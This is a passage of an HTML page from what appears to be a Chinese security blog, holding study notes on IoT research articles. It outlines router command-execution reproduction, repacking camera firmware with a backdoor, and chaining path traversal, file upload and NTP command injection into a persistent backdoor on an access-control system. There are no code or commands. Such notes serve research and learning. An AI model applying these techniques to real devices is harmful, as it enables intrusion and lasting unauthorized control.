+<li>2：sp赋值r0，作为system参数</li>
+</ul>
+</li>
+</ul>
+<h2 id="复现｜路由器命令执行"><a href="#复现｜路由器命令执行" class="headerlink" title="复现｜路由器命令执行"></a>复现｜路由器命令执行</h2><ul>
+<li>模拟，过程很完整，ssh连接了qemu，多个终端，一个起进程，另一个可ps等</li>
+<li>分析，通过端口找进程，4种方法见另篇文章</li>
+<li>扩展，内网扩大到外网，利用csrf</li>
+</ul>
+<h2 id="复现｜摄像头固件重打包"><a href="#复现｜摄像头固件重打包" class="headerlink" title="复现｜摄像头固件重打包"></a>复现｜摄像头固件重打包</h2><ul>
+<li>思路很清晰，看目录</li>
+<li>docker版qemu</li>
+<li>重要的是固件上传的校验及绕过（校验的是uimage，即uboot</li>
+<li>自己编译一个后门程序，还有利用现成的，如utelnet等</li>
+<li>固件重打包：mksquashfs、mkimage、还注意加载基址和入口点</li>
+</ul>
+<h2 id="漏洞组合拳劫持门禁控制系统"><a href="#漏洞组合拳劫持门禁控制系统" class="headerlink" title="漏洞组合拳劫持门禁控制系统"></a>漏洞组合拳劫持门禁控制系统</h2><ul>
+<li>认证绕过<ul>
+<li>cookie文件目录遍历+未认证文件上传</li>
+<li>通过 cookie进行认证，http中cookie对应服务端上的cookie文件</li>
+<li>文件上传功能不需要认证，可伪造一个cookie文件上传</li>
+<li>目录遍历找到上传的伪造cookie文件，即可通过认证</li>
+</ul>
+</li>
+<li>持久化后门<ul>
+<li>文件上传 + 命令注入（二者都需认证绕过）</li>
+<li>可上传用户照片，仅限制图片后缀，并没检查文件内容</li>
+<li>设置ntp服务器，存在命令注入，但长度受限</li>
+<li>构造恶意脚本、上传脚本、注入点执行脚本</li>
+<li>后门：交互式（有回显）的命令执行，类似shell。恶意脚本在cookie中放置待执行命令</li>
+<li>持久化：每次开机都会执行，不能断电失效，如tmp目录。配置ntp后重启生效，在启动时会解析配置</li>
+</ul>
+</li>
+<li>漏洞利用链<ul>
+<li>共4个漏洞，前2组合成认证绕过，全部组合成持久化后门</li>
+<li>目录遍历实现数据读取，文件上传实现数据写入</li>
+<li>别轻视低危漏洞，找到读写原语，实现组合漏洞</li>
+</ul>
+</li>
+</ul>
+<h2 id="Flash-Dump技术解析"><a href="#Flash-Dump技术解析" class="headerlink" title="Flash Dump技术解析"></a>Flash Dump技术解析</h2><ul>
+<li>思路清晰，见目录</li>
+<li>flash中的固件一般不加密，且从flash中提取法比较通用</li>
+<li>拆卸、焊接、读取的硬件工具</li>
+<li>基于统计法修复数据、nand会有ecc校验位</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>21Guns
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://21guns.top/2021/06/21/iot/IOT安全-文章学习笔记-2/" title="IOT安全-文章学习笔记-2">http://21guns.top/2021/06/21/iot/IOT安全-文章学习笔记-2/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/路由器/" rel="tag"># 路由器</a>
+              <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+              <a href="/tags/摄像头/" rel="tag"># 摄像头</a>
+              <a href="/tags/命令注入/" rel="tag"># 命令注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/11/iot/Tenda溢出漏洞-CVE-2018-18708分析/" rel="prev" title="Tenda溢出漏洞-CVE-2018-18708分析">
+      <i class="fa fa-chevron-left"></i> Tenda溢出漏洞-CVE-2018-18708分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/06/22/iot/Netgear R8300认证前RCE的漏洞分析及利用/" rel="next" title="Netgear R8300认证前RCE的漏洞分析及利用">
+      Netgear R8300认证前RCE的漏洞分析及利用 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#IOT安全-文章学习笔记-2"><span class="nav-number">1.</span> <span class="nav-text">IOT安全-文章学习笔记-2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析"><span class="nav-number">1.1.</span> <span class="nav-text">CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NetGear-夜鹰-RAX40V2-设备与固件分析"><span class="nav-number">1.2.</span> <span class="nav-text">NetGear 夜鹰 RAX40V2 设备与固件分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-26567-DSR-250N-远程拒绝服务漏洞分析"><span class="nav-number">1.3.</span> <span class="nav-text">CVE-2020-26567 DSR-250N 远程拒绝服务漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linksys-EA6100-固件解密分析"><span class="nav-number">1.4.</span> <span class="nav-text">Linksys EA6100 固件解密分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NetGear-R7000P-路由器栈溢出漏洞硬件调试与分析"><span class="nav-number">1.5.</span> <span class="nav-text">NetGear R7000P 路由器栈溢出漏洞硬件调试与分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一次嵌入式固件逆向实践"><span class="nav-number">1.6.</span> <span class="nav-text">一次嵌入式固件逆向实践</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DLink路由器固件的一次分析记录"><span class="nav-number">1.7.</span> <span class="nav-text">DLink路由器固件的一次分析记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iot初体验-智能设备"><span class="nav-number">1.8.</span> <span class="nav-text">iot初体验-智能设备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IoT设备固件分析教程之固件是怎么存储的"><span class="nav-number">1.9.</span> <span class="nav-text">IoT设备固件分析教程之固件是怎么存储的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#记一次网关设备的pwn"><span class="nav-number">1.10.</span> <span class="nav-text">记一次网关设备的pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018-年-IoT-那些事儿"><span class="nav-number">1.11.</span> <span class="nav-text">2018 年 IoT 那些事儿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#由一道工控路由器固件逆向题目看命令执行漏洞"><span class="nav-number">1.12.</span> <span class="nav-text">由一道工控路由器固件逆向题目看命令执行漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#强网杯2020决赛-ciscoRV110W-web服务漏洞复现"><span class="nav-number">1.13.</span> <span class="nav-text">强网杯2020决赛 ciscoRV110W web服务漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路由器篡改固件添加后门"><span class="nav-number">1.14.</span> <span class="nav-text">路由器篡改固件添加后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过设备UART接口调试获取shell"><span class="nav-number">1.15.</span> <span class="nav-text">通过设备UART接口调试获取shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IoT漏洞研究（一）固件基础"><span class="nav-number">1.16.</span> <span class="nav-text">IoT漏洞研究（一）固件基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现"><span class="nav-number">1.17.</span> <span class="nav-text">僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现影响79款Netgear路由器高危漏洞"><span class="nav-number">1.18.</span> <span class="nav-text">复现影响79款Netgear路由器高危漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现｜路由器命令执行"><span class="nav-number">1.19.</span> <span class="nav-text">复现｜路由器命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现｜摄像头固件重打包"><span class="nav-number">1.20.</span> <span class="nav-text">复现｜摄像头固件重打包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞组合拳劫持门禁控制系统"><span class="nav-number">1.21.</span> <span class="nav-text">漏洞组合拳劫持门禁控制系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flash-Dump技术解析"><span class="nav-number">1.22.</span> <span class="nav-text">Flash Dump技术解析</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">21Guns</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">164</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">71</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">21Guns</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
